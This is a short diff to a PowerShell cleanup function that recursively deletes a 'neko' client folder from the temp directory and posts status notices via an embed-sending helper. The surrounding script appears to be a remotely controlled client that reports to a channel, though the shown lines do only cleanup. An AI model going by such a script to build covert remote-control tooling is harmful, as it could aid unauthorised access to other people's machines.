@@ -25,7 +25,7 @@ function Mremoveneko {
     $tempfolder = "$env:temp\neko"
     sendEmbedWithImage -Title "NEKO CLIENT BEING REMOVED" -Description "Neko client files are being removed."
     if (Test-Path -Path $tempfolder) {
-        rm -Path $tempfolder -Force
+        rm -Path $tempfolder -Force -Recurse
         sendEmbedWithImage -Title "NEKO CLIENT REMOVED" -Description "Neko client files have been removed."
     }
 }
